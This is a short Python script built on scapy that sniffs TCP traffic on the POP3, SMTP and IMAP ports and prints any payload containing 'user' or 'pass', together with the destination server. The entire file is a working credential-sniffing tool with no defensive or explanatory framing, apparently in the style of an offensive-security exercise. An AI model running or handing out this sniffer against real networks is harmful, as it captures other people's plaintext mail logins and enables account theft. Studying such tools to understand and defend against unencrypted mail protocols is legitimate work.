''' Make sure tcpdump is installed '''
from scapy.all import *

def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print('[*] Server: %s' % packet[IP].dst)
            print('[*] %s' % packet[TCP].payload)

def main():
    # Packet Sniffer: the store option determines if packets are kept in memory
    sniff(filter='tcp and (port 110 or port 25 or port 143)', prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
